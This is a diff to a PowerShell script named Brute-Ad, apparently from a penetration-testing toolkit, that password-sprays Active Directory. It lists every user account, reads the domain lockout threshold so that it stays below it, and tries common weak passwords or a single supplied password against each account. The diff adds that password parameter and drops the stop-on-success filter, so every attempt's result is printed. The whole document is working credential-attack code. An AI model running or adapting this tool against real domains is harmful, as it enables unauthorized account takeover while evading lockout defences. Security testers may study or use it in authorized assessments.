@@ -10,12 +10,19 @@
 	Brute-Ad | Where {$_.IsValid -eq $True}
 	Generate a PSObject of results where the password attempt is successful 
 .EXAMPLE
-	Brute-Ad -StopOnSuccess True
+	Brute-Ad -Password 'OnePasswordAttempt'
 	Brute-forces active directory user accounts based on the password lockout threshold but stops on a sucessful attempt
 #>
 function Brute-Ad 
 {
-	param($ShowOnlyTrue='True')
+	param($ShowOnlyTrue='True', $Password)
+
+    if ($Password) {
+        $allpasswords = @("$Password")
+    } else {
+        $allpasswords = @('Password1','password','Password2015','Pa55w0rd','password123','Pa55w0rd1234')
+    }
+
 	Function Get-LockOutThreshold  
 	{
 		$domain = [ADSI]"WinNT://$env:userdomain"
@@ -41,9 +48,9 @@ function Brute-Ad
 
 	$domain = $env:USERDOMAIN
 	$username = ''
-	$allpasswords = @('Password1','password','Password2015','Pa55w0rd','password123','Pa55w0rd1234')
 
 	$lockoutthres =  $lockout.'Account Lockout Threshold (Invalid logon attempts)'
+
 	if (!$lockoutthres)
 	{
 	    $passwords = $allpasswords #no lockout threshold
@@ -58,22 +65,14 @@ function Brute-Ad
 	}
 
 	$DirSearcher = New-Object System.DirectoryServices.DirectorySearcher([adsi]'')
-	$DirSearcher.Filter = '(&(objectCategory=Person)(objectClass=User))'
-	$DirSearcher.FindAll().GetEnumerator() | ForEach-Object{
+    $DirSearcher.Filter = '(&(objectCategory=Person)(objectClass=User))'
+	$DirSearcher.FindAll().GetEnumerator() | ForEach-Object{ 
 
 	    $username = $_.Properties.samaccountname
 	    foreach ($password in $passwords) 
 	    {
 	    	$result = Test-ADCredential $username $password 
-	    	if (($ShowOnlyTrue -eq 'True') -and ($result.IsValid -eq 'True')){
-	    		$break = $true
-	    		$result
-	    	}
-            #else
-            #{
-	    	#	$result
-	    	#}
-	    	if ($break -eq 'True'){break}
+	    	$result
 	    }
 	}
 }
